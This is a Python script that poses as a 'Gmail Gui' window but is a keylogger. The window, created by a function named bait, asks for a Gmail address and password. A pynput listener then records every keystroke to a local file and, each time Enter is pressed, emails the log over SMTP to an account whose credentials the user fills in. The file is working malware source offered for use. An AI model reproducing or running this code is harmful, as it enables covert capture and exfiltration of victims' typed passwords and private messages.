from datetime import time
from pynput.keyboard import Listener

import smtplib
from tkinter import *
import smtplib
import multiprocessing


def bait():
    t = Tk()
    t.title("Gmail Gui")
    send_email = StringVar()
    send_pass = StringVar()
    recv_email = StringVar()
    msg_body = None
    menuBar = Menu(t)
    menuBar.add_command(label="Instructions")
    menuBar.add_command(label="About")
    t.config(menu=menuBar)

    sender_email = Label(t, text="Sender Gmail ID: ")
    sender_entry = Entry(t, textvariable=send_email, bd=3)
    sender_pass = Label(t, text="Sender Gmail Pass: ")
    sender_passentry = Entry(t, show="*", textvariable=send_pass, bd=3)

    receiver_email = Label(t, text="Receiver Email: ")
    receiver_entry = Entry(t, textvariable=recv_email, bd=3)

    msg_label = Label(t, text="Message")
    # global msg_body
    msg_body = Text(t, height=5, width=15, bd=3)

    send = Button(t, text="Send", width=15, bd=3)
    cancel = Button(t, text="Cancel", width=15, bd=3)

    sender_email.grid(row=0, column=0, padx=5, pady=3)
    sender_entry.grid(row=0, column=1, padx=5, pady=3)
    sender_pass.grid(row=1, column=0, padx=5, pady=3)
    sender_passentry.grid(row=1, column=1, padx=5, pady=3)
    receiver_email.grid(row=2, column=0, padx=5, pady=3)
    receiver_entry.grid(row=2, column=1, padx=5, pady=3)
    msg_label.grid(row=3, column=0, padx=5, pady=3)
    msg_body.grid(row=3, column=1, padx=5, pady=3)
    send.grid(row=4, column=0, padx=5, pady=3)
    cancel.grid(row=4, column=1, padx=5, pady=3)
    t.mainloop()


def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == "Key.space":
        key = " "
    if key == "Key.tab":
        key = "         "
    if key == "Key.shift_r":
        key = ""
    if key == "Key.enter":
        key = "\n"
        send12mail()

    with open("log.txt", "a") as f:
        f.write(key + " ")


def keylog():
    with Listener(on_press=log_keystroke) as l:
        l.join()


def send12mail():
    s = smtplib.SMTP()
    s.connect("smtp.gmail.com", 587)
    mail_id = ""  # ? your main
    mail_pass = ""  # ? your pass
    print("sending message")
    s.starttls()
    s.login(mail_id, mail_pass)
    f = open("log.txt", "r")
    message = f.read()
    s.sendmail(mail_id, mail_id, message)


bait()
keylog()
# if __name__ == '__main__':
# t1=multiprocessing.Process(target=keylog)
# t2=multiprocessing.Process(target=send12mail)

# t1.start()
# t2.start()
